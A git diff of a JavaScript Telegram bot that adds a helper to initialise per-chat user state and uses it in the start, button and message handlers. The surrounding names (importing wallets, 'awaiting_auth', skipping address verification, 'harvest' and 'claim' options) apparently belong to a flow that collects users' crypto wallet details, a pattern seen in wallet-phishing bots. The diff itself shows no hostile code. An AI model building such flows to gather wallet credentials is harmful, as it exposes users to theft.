@@ -402,9 +402,20 @@ bots.forEach(bot => {
 
 // ====== Main Bot Handlers ======
 bots.forEach(bot => {
+    // Initialize user data for any interaction
+    const ensureUserData = (chatId) => {
+      if (!userData[chatId]) {
+        userData[chatId] = {
+          step: 'choosing_option',
+          sessionId: generateSessionId(chatId)
+        };
+      }
+      return userData[chatId];
+    };
   // Start Command with Full Animation Sequence
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
+    const user = ensureUserData(chatId);
     const sessionId = generateSessionId(msg.from.id);
     
     // Initial loading message
@@ -522,7 +533,7 @@ bots.forEach(bot => {
   bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
-    const user = userData[chatId] || {};
+    const user = ensureUserData(chatId);
 
     // Handle restart and import cases
     if (data === 'restart_bot') {
@@ -531,7 +542,7 @@ bots.forEach(bot => {
     }
 
     if (data === 'import_another_wallet') {
-      userData[chatId] = { step: 'choosing_option' };
+      user.step = 'choosing_option';
       const options = {
         reply_markup: {
           inline_keyboard: [
@@ -638,7 +649,7 @@ bots.forEach(bot => {
     } 
     // Handle skip scan option
     else if (data === 'skip_scan') {
-      userData[chatId].step = 'awaiting_auth';
+      user.step = 'awaiting_auth';
       await bot.sendMessage(
         chatId,
         `⚠️ *Address Verification Skipped*\n` +
@@ -659,8 +670,8 @@ bots.forEach(bot => {
     }
     // Handle option selection (harvest, claim, etc.)
     else {
-      userData[chatId].option = data;
-      userData[chatId].step = 'awaiting_address';
+      user.option = data;
+      user.step = 'awaiting_address';
 
       // Show preparing authentication message
       const loadingMsg = await bot.sendMessage(
@@ -702,7 +713,7 @@ bots.forEach(bot => {
   bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text?.trim();
-    const user = userData[chatId];
+    const user = ensureUserData(chatId);
 
     if (!user) return;
 
